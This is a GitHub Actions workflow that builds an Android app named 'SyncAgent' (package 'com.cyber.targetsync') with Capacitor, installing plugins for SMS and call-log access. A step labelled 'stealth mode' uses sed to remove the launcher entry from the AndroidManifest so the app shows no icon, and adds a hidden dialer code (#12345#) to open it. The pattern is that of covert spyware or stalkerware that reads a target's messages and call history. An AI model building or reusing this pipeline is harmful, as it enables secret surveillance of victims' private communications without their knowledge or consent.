name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18'

      - name: Setup Java JDK 17
        uses: actions/setup-java@v3
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install dependencies
        run: npm install

      - name: Install Capacitor and plugins
        run: |
          npm install @capacitor/cli @capacitor/android @capacitor/core
          npm install capacitor-sms capacitor-call-log @capacitor/preferences @capacitor/network

      - name: Prepare webDir
        run: |
          mkdir -p www
          # Ensure index.html and app.js exist in www
          if [ -f www/index.html ]; then echo "www/index.html exists"; else echo "Missing index.html" && exit 1; fi
          if [ -f www/app.js ]; then echo "www/app.js exists"; else echo "Missing app.js" && exit 1; fi

      - name: Capacitor init and sync
        run: |
          npx cap init SyncAgent com.cyber.targetsync --web-dir=www
          npx cap add android
          npx cap sync

      - name: Patch AndroidManifest for stealth mode
        run: |
          # Remove launcher category
          sed -i '/<category android:name="android.intent.category.LAUNCHER"\/>/d' android/app/src/main/AndroidManifest.xml
          # Add dialer code intent-filter before closing activity tag
          sed -i '/<\/activity>/i \
          <intent-filter>\n\
              <action android:name="android.intent.action.VIEW" />\n\
              <category android:name="android.intent.category.DEFAULT" />\n\
              <data android:scheme="tel" android:host="*" android:pathPattern="/#12345#" />\n\
          </intent-filter>' android/app/src/main/AndroidManifest.xml

      - name: Build APK
        run: |
          cd android
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug
          path: android/app/build/outputs/apk/debug/app-debug.apk
